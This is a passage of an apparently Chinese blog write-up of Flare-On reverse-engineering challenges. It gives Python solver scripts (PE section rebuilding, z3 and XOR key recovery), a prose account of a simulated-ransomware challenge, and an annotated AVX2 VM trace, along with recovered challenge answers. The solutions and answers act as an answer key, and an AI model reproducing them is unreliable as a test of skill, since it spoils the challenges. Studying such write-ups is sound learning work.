class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrong</span>():</span></span><br><span class="line">    trust = pydll.LoadLibrary(<span class="string">r&#x27;F:\copy.exe&#x27;</span>)._handle</span><br><span class="line"></span><br><span class="line">    computer = string_at(trust, <span class="number">1024</span>)</span><br><span class="line">    <span class="comment"># print(computer)</span></span><br><span class="line"></span><br><span class="line">    dirty, = struct.unpack_from(<span class="string">&#x27;=I&#x27;</span>, computer, <span class="number">60</span>)</span><br><span class="line"></span><br><span class="line">    _, _, organize, _, _, _, variety, _ =  struct.unpack_from(<span class="string">&#x27;=IHHIIIHH&#x27;</span>, computer, dirty)</span><br><span class="line">    <span class="keyword">assert</span> variety &gt;= <span class="number">144</span></span><br><span class="line"></span><br><span class="line">    participate, = struct.unpack_from(<span class="string">&#x27;=I&#x27;</span>, computer, dirty + <span class="number">40</span>)</span><br><span class="line">    <span class="keyword">for</span> insurance <span class="keyword">in</span> range(organize):</span><br><span class="line">        name, tropical, inhabitant, reader, chalk, _, _, _, _, _ = struct.unpack_from(<span class="string">&#x27;=8sIIIIIIHHI&#x27;</span>, computer, <span class="number">40</span> * insurance + dirty + variety + <span class="number">24</span>)</span><br><span class="line">        <span class="keyword">if</span> inhabitant &lt;= participate &lt; inhabitant + tropical:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    spare = bytearray(string_at(trust + inhabitant, tropical))</span><br><span class="line">    </span><br><span class="line">    issue, digital = struct.unpack_from(<span class="string">&#x27;=II&#x27;</span>, computer, dirty + <span class="number">0xa0</span>)</span><br><span class="line">    truth = string_at(trust + issue, digital)</span><br><span class="line"></span><br><span class="line">    expertise = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> expertise &lt;= len(truth) - <span class="number">8</span>:</span><br><span class="line">        nuance, seem = struct.unpack_from(<span class="string">&#x27;=II&#x27;</span>, truth, expertise)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> nuance == <span class="number">0</span> <span class="keyword">and</span> seem == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        slot = truth[expertise + <span class="number">8</span>:expertise + seem]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(slot) &gt;&gt; <span class="number">1</span>):</span><br><span class="line">            diet, = struct.unpack_from(<span class="string">&#x27;=H&#x27;</span>, slot, <span class="number">2</span> * i)</span><br><span class="line">            fabricate = diet &gt;&gt; <span class="number">12</span></span><br><span class="line">            <span class="keyword">if</span> fabricate != <span class="number">3</span>: <span class="keyword">continue</span></span><br><span class="line">            diet = diet &amp; <span class="number">4095</span></span><br><span class="line">            ready = nuance + diet - inhabitant</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt;= ready &lt; len(spare): </span><br><span class="line">                struct.pack_into(<span class="string">&#x27;=I&#x27;</span>, spare, ready, struct.unpack_from(<span class="string">&#x27;=I&#x27;</span>, spare, ready)[<span class="number">0</span>] - trust)</span><br><span class="line"></span><br><span class="line">        expertise += seem</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;md5.bin&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(spare)</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(spare).digest()</span><br><span class="line"></span><br><span class="line"><span class="comment"># def main():</span></span><br><span class="line"><span class="comment">#     print wrong().encode(&#x27;hex&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     print &#x27;end.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print(wrong())</span><br></pre></td></tr></table></figure><p>得到MD5后反算求 lauchcode，利用z3进行求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">xor = [<span class="number">212</span>, <span class="number">162</span>, <span class="number">242</span>, <span class="number">218</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">50</span>, <span class="number">31</span>, <span class="number">125</span>, <span class="number">112</span>, <span class="number">249</span>, <span class="number">83</span>, <span class="number">55</span>, <span class="number">187</span>, <span class="number">131</span>, <span class="number">206</span>]</span><br><span class="line"></span><br><span class="line">b =  [<span class="number">0xa7</span>,<span class="number">0xbf</span>,<span class="number">0xd2</span>,<span class="number">0x9e</span>,<span class="number">0x0f</span>,<span class="number">0x01</span>,<span class="number">0x6b</span>,<span class="number">0x53</span>,<span class="number">0x68</span>,<span class="number">0x37</span>,<span class="number">0xb7</span>,<span class="number">0x60</span>,<span class="number">0x7c</span>,<span class="number">0xba</span>,<span class="number">0xb4</span>,<span class="number">0xa8</span>]</span><br><span class="line"></span><br><span class="line">b = [b[i] ^ xor[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line">print(b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x=[BitVec(<span class="string">&#x27;x[%d]&#x27;</span> % i,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(b))]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.add(b[<span class="number">0</span>] == x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">14</span>])</span><br><span class="line">s.add(b[<span class="number">1</span>] == x[<span class="number">0</span>] ^ x[<span class="number">1</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>])</span><br><span class="line">s.add(b[<span class="number">2</span>] == x[<span class="number">0</span>] ^ x[<span class="number">1</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(b[<span class="number">3</span>] == x[<span class="number">5</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(b[<span class="number">4</span>] == x[<span class="number">1</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(b[<span class="number">5</span>] == x[<span class="number">0</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(b[<span class="number">6</span>] == x[<span class="number">1</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(b[<span class="number">7</span>] == x[<span class="number">0</span>] ^ x[<span class="number">1</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">14</span>])</span><br><span class="line">s.add(b[<span class="number">8</span>] == x[<span class="number">1</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>])</span><br><span class="line">s.add(b[<span class="number">9</span>] == x[<span class="number">6</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(b[<span class="number">10</span>] == x[<span class="number">0</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">8</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(b[<span class="number">11</span>] == x[<span class="number">0</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">13</span>])</span><br><span class="line">s.add(b[<span class="number">12</span>] == x[<span class="number">0</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(b[<span class="number">13</span>] == x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">4</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">6</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">12</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>])</span><br><span class="line">s.add(b[<span class="number">14</span>] == x[<span class="number">1</span>] ^ x[<span class="number">2</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">7</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">14</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(b[<span class="number">15</span>] == x[<span class="number">1</span>] ^ x[<span class="number">3</span>] ^ x[<span class="number">5</span>] ^ x[<span class="number">9</span>] ^ x[<span class="number">10</span>] ^ x[<span class="number">11</span>] ^ x[<span class="number">13</span>] ^ x[<span class="number">15</span>])</span><br><span class="line">s.add(x[<span class="number">11</span>] &gt; <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">print(s.check())</span><br><span class="line">answer=s.model()</span><br><span class="line">print(answer)</span><br><span class="line"></span><br><span class="line"><span class="comment"># import string</span></span><br><span class="line"><span class="comment"># table = string.printable</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>求解 lauchcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x</span><br><span class="line">[<span class="number">53</span>, <span class="number">67</span>, <span class="number">48</span>, <span class="number">71</span>, <span class="number">55</span>, <span class="number">84</span>, <span class="number">89</span>, <span class="number">50</span>, <span class="number">76</span>, <span class="number">87</span>, <span class="number">73</span>, <span class="number">50</span>, <span class="number">89</span>, <span class="number">88</span>, <span class="number">77</span>, <span class="number">66</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line"><span class="meta">... </span>    s += chr(i)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line"><span class="string">&#x27;5C0G7TY2LWI2YXMB&#x27;</span></span><br></pre></td></tr></table></figure><p>最后把lauchcode喂给程序即可</p><h2 id="8-snake"><a href="#8-snake" class="headerlink" title="8 - snake"></a>8 - snake</h2><p>一个NES题目，通过选择process为6502进行反汇编</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190823183745.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190823183745.png"></a></p><p>发现当分数为0x33，且游戏轮次为 4 的时候 可打印flag</p><p>或者我们直接将此处的 </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190823184037.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190823184037.png"></a></p><p>$F0的值修改为 26偏移处的值相等即可，利用 ** fceux** 进行调试</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190823184150.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190823184150.png"></a></p><h2 id="9-reloadered"><a href="#9-reloadered" class="headerlink" title="9 - reloadered"></a>9 - reloadered</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="literal">None</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xb</span>)]</span><br><span class="line">b = [<span class="number">0x7A</span>,<span class="number">0x17</span>,<span class="number">0x08</span>,<span class="number">0x34</span>,<span class="number">0x17</span>,<span class="number">0x31</span>,<span class="number">0x3B</span>,<span class="number">0x25</span>,<span class="number">0x5B</span>,<span class="number">0x18</span>,<span class="number">0x2E</span>,<span class="number">0x3A</span>,<span class="number">0x15</span>,<span class="number">0x56</span>,<span class="number">0x0E</span>,<span class="number">0x11</span>,<span class="number">0x3E</span>,<span class="number">0x0D</span>,<span class="number">0x11</span>,<span class="number">0x3B</span>,<span class="number">0x24</span>,<span class="number">0x21</span>,<span class="number">0x31</span>,<span class="number">0x06</span>,<span class="number">0x3C</span>,<span class="number">0x26</span>,<span class="number">0x7C</span>,<span class="number">0x3C</span>,<span class="number">0x0D</span>,<span class="number">0x24</span>,<span class="number">0x16</span>,<span class="number">0x3A</span>,<span class="number">0x14</span>,<span class="number">0x79</span>,<span class="number">0x01</span>,<span class="number">0x3A</span>,<span class="number">0x18</span>,<span class="number">0x5A</span>,<span class="number">0x58</span>,<span class="number">0x73</span>,<span class="number">0x2E</span>,<span class="number">0x09</span>,<span class="number">0x00</span>,<span class="number">0x16</span>,<span class="number">0x00</span>,<span class="number">0x49</span>,<span class="number">0x22</span>,<span class="number">0x01</span>,<span class="number">0x40</span>,<span class="number">0x08</span>,<span class="number">0x0A</span>,<span class="number">0x14</span>,<span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line">c = <span class="string">&quot;@flare-on.com&quot;</span></span><br><span class="line">print(len(c))</span><br><span class="line">print(len(b))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    r = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(c)):</span><br><span class="line">        r.append(chr(b[<span class="number">40</span>-j+i]^ord(c[i])))</span><br><span class="line">    print(<span class="string">&quot;&quot;</span>.join(r))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">passwd = <span class="string">&quot;3HeadedMonkey&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    r = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(b)):</span><br><span class="line">        r.append(chr(b[i]^ord(passwd[i % len(passwd)])))</span><br><span class="line">    print(<span class="string">&quot;&quot;</span>.join(r))</span><br></pre></td></tr></table></figure><h2 id="10-Mugatu"><a href="#10-Mugatu" class="headerlink" title="10 -  Mugatu"></a>10 -  Mugatu</h2><p>程序及dll的IAT项交换了。静态看不出到底调用了什么函数，需要还原。</p><p>程序模拟了勒索软件。从twitter的RSS中获取信息来编码目标机的环境信息，然后上传，得到返回的加密密钥。然后从资源中获取dll数据，并加载到内存，枚举盘符，搜索really, really, really, ridiculously good looking gifs文件夹，并加密其下的gif文件。加密算法采用tea。</p><p>解算比较简单。先把另一张图片解密，key在其文件名中已经给出。得到第二第图片的key的第一个字节。题目上中key的长度是4个字节。所以根据gif文件头爆破三个字节的key，然后解密</p><h2 id="11-avx2"><a href="#11-avx2" class="headerlink" title="11 - avx2"></a>11 - avx2</h2><p>考察avx2指令<br>VM代码解析如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br></pre></td><td class="code"><pre><span class="line">memset</span><br><span class="line">vmovdqu_mm ptr[0] , 0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">vmovdqu_mm ptr[1] , 0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">vmovdqu_mm ptr[3] , 0x1A1B1B1B1A13111111111111111111151A1B1B1B1A1311111111111111111115</span><br><span class="line">vmovdqu_mm ptr[4] , 0x1010101010101010080408040201101010101010101010100804080402011010</span><br><span class="line">vmovdqu_mm ptr[5] , 0x0000000000000000B9B9BFBF041310000000000000000000B9B9BFBF04131000</span><br><span class="line">vmovdqu_mm ptr[6] , 0x2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F</span><br><span class="line">vmovdqu_mm ptr[10] , 0x0140014001400140014001400140014001400140014001400140014001400140</span><br><span class="line">vmovdqu_mm ptr[11] , 0x0001100000011000000110000001100000011000000110000001100000011000</span><br><span class="line">vmovdqu_mm ptr[12] , 0xFFFFFFFF0C0D0E08090A040506000102FFFFFFFF0C0D0E08090A040506000102</span><br><span class="line">vmovdqu_mm ptr[13] , 0xFFFFFFFFFFFFFFFF000000060000000500000004000000020000000100000000</span><br><span class="line">vmovdqu_mm ptr[16] , 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF</span><br><span class="line">vmovdqu_mm ptr[17] , 0x6A09E667BB67AE853C6EF372A54FF53A510E527F9B05688C1F83D9AB5BE0CD19</span><br><span class="line">vmovdqu_mm ptr[18] , 0x428A2F9871374491B5C0FBCFE9B5DBA53956C25B59F111F1923F82A4AB1C5ED5</span><br><span class="line">vmovdqu_mm ptr[19] , 0x0000000300000002000000010000000000000007000000060000000500000004</span><br><span class="line">vmovdqu_mm ptr[20] , 0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">vmovdqu_mm ptr[21] , 0x0000000100000001000000010000000100000001000000010000000100000001</span><br><span class="line">vmovdqu_mm ptr[22] , 0x0000000200000002000000020000000200000002000000020000000200000002</span><br><span class="line">vmovdqu_mm ptr[23] , 0x0000000300000003000000030000000300000003000000030000000300000003</span><br><span class="line">vmovdqu_mm ptr[24] , 0x0000000400000004000000040000000400000004000000040000000400000004</span><br><span class="line">vmovdqu_mm ptr[25] , 0x0000000500000005000000050000000500000005000000050000000500000005</span><br><span class="line">vmovdqu_mm ptr[26] , 0x0000000600000006000000060000000600000006000000060000000600000006</span><br><span class="line">vmovdqu_mm ptr[27] , 0x0000000700000007000000070000000700000007000000070000000700000007</span><br><span class="line">vpermd ptr[20] , ptr[0] , ptr[20]</span><br><span class="line">vpermd ptr[21] , ptr[0] , ptr[21]</span><br><span class="line">vpermd ptr[22] , ptr[0] , ptr[22]</span><br><span class="line">vpermd ptr[23] , ptr[0] , ptr[23]</span><br><span class="line">vpermd ptr[24] , ptr[0] , ptr[24]</span><br><span class="line">vpermd ptr[25] , ptr[0] , ptr[25]</span><br><span class="line">vpermd ptr[26] , ptr[0] , ptr[26]</span><br><span class="line">vpermd ptr[27] , ptr[0] , ptr[27]</span><br><span class="line">vpsrld ptr[7] , ptr[1] , 0x04</span><br><span class="line">vpxor ptr[28] , ptr[20] , ptr[21]</span><br><span class="line">vpxor ptr[28] , ptr[28] , ptr[22]</span><br><span class="line">vpxor ptr[28] , ptr[28] , ptr[23]</span><br><span class="line">vpxor ptr[28] , ptr[28] , ptr[24]</span><br><span class="line">vpxor ptr[28] , ptr[28] , ptr[25]</span><br><span class="line">vpxor ptr[28] , ptr[28] , ptr[26]</span><br><span class="line">vpxor ptr[28] , ptr[28] , ptr[27]</span><br><span class="line"></span><br><span class="line">vpand ptr[7] , ptr[7] , ptr[6]</span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x07ror 25</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x19</span><br><span class="line">vpor ptr[15] , ptr[29] , ptr[30]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpcmpeqb ptr[8] , ptr[1] , ptr[6]0</span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x15</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x0Bror 11</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29](17 ror 25)  ^ (17 ror 11)</span><br><span class="line"></span><br><span class="line">vpcmpeqb ptr[8] , ptr[1] , ptr[6]0</span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x1A</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x06ror 6</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6)</span><br><span class="line"></span><br><span class="line">vpxor ptr[29] , ptr[20] , ptr[16]</span><br><span class="line">vpand ptr[30] , ptr[20] , ptr[18]</span><br><span class="line">vpxor ptr[29] , ptr[29] , ptr[30]~ptr[20]^(ptr[20] &amp; ptr[18] &#x3D;&#x3D; ptr[18]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpaddd ptr[15] , ptr[29] , ptr[15](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) + (~ptr[20]^(ptr[20] &amp; ptr[18])</span><br><span class="line">vpaddd ptr[20] , ptr[15] , 